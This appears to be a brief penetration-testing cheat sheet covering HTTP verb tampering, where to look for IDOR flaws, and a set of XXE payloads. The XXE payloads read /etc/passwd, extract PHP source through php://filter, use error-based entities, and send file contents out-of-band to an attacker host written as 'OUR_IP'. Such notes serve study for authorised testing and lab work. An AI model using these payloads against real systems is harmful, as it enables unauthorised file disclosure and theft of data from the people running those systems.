## HTTP Verb Tampering
```
HEAD
PUT
DELETE
OPTIONS
PATCH
```

## IDOR
Identify IDORs in
- URL parameters & APIs
- AJAX calls
- understanding reference hashing/encoding
- comparing user roles
```
md5sum
base64
```

## XXE
```
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
